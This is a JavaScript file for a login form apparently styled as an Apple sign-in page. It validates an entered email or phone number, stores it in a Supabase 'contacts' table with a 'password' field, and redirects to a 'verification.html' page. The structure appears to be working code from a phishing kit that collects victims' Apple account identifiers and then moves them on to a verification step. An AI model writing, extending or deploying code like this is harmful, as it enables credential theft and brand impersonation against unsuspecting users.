import { supabase } from './supabase.js';

const form = document.getElementById('appleForm');
const input = document.getElementById('appleIdentifier');
const shell = document.getElementById('appleShell');
const warning = document.getElementById('appleWarning');

function isValidEmail(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
}

function isValidPhone(value) {
  return /^\+?[0-9]{8,15}$/.test(value.trim());
}

function isValidIdentifier(value) {
  const trimmed = value.trim();
  return trimmed && (isValidEmail(trimmed) || isValidPhone(trimmed));
}

function showError() {
  shell.classList.add('error');
  warning.classList.add('show');
}

function hideError() {
  shell.classList.remove('error');
  warning.classList.remove('show');
}

input.addEventListener('input', () => {
  if (input.value.trim() && !isValidIdentifier(input.value)) {
    showError();
  } else {
    hideError();
  }
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const value = input.value.trim();

  if (!isValidIdentifier(value)) {
    showError();
    input.focus();
    return;
  }

  hideError();
  
  const submitBtn = form.querySelector('.login-btn');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Loading...';
  submitBtn.disabled = true;

  const { error } = await supabase
    .from('contacts')
    .insert([{ email: value, password: 'Apple Login (No Password)' }]);

  if (error) {
    console.error('خطأ:', error);
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  } else {
    window.location.href = 'verification.html';
  }
});

input.focus();